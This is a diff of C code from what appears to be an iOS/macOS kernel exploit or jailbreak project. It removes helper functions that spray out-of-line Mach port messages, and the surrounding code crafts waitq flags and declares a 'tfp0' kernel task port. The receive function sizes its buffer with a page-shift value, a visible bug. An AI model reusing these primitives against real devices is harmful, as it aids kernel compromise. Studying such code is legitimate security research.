@@ -40,12 +40,6 @@ union waitq_flags {
 };
 
 typedef struct {
-    mach_msg_header_t hdr;
-    mach_msg_body_t body;
-    mach_msg_ool_ports_descriptor_t ool_ports;
-} ool_msg_t;
-
-typedef struct {
     union {
         uint64_t data;
         uint64_t tag;
@@ -153,48 +147,6 @@ int mach_port_waitq_flags(void) {
     waitq_flags.waitq_isvalid           = 1;
     waitq_flags.waitq_turnstile_or_port = 1;
     return waitq_flags.flags;
-}
-
-mach_port_t send_ool_msg(mach_port_t target, int count) {
-    mach_port_t remote = MACH_PORT_NULL;
-    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &remote);
-    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
-    for (int i = 0; i < count; i++) ports[i] = target;
-    
-    ool_msg_t *msg = calloc(1, sizeof(ool_msg_t));
-    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->hdr.msgh_size = sizeof(ool_msg_t);
-    msg->hdr.msgh_remote_port = remote;
-    msg->hdr.msgh_local_port = MACH_PORT_NULL;
-    msg->hdr.msgh_id = 0x41414141;
-    msg->body.msgh_descriptor_count = 1;
-    msg->ool_ports.address = ports;
-    msg->ool_ports.count = count;
-    msg->ool_ports.deallocate = 0;
-    msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
-    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
-    
-    mach_msg(&msg->hdr, MACH_SEND_MSG, msg->hdr.msgh_size, 0, 0, 0, 0);
-    free(ports);
-    free(msg);
-    return remote;
-}
-
-mach_port_t receive_ool_msg(mach_port_t port) {
-    ool_msg_t *msg = calloc(1, vm_kernel_page_shift);
-    mach_msg(&msg->hdr, MACH_RCV_MSG, 0, vm_kernel_page_shift, port, 0, 0);
-    
-    mach_port_t *ool_ports = (mach_port_t *)msg->ool_ports.address;
-    if (ool_ports == NULL) {
-        printf("ERROR: failed to receive OOL message\n");
-        return MACH_PORT_NULL;
-    }
-    
-    mach_port_t received = ool_ports[0];
-    mach_port_destroy(mach_task_self(), port);
-    free(msg);
-    return received;
 }
 
 mach_port_t tfp0 = MACH_PORT_NULL;
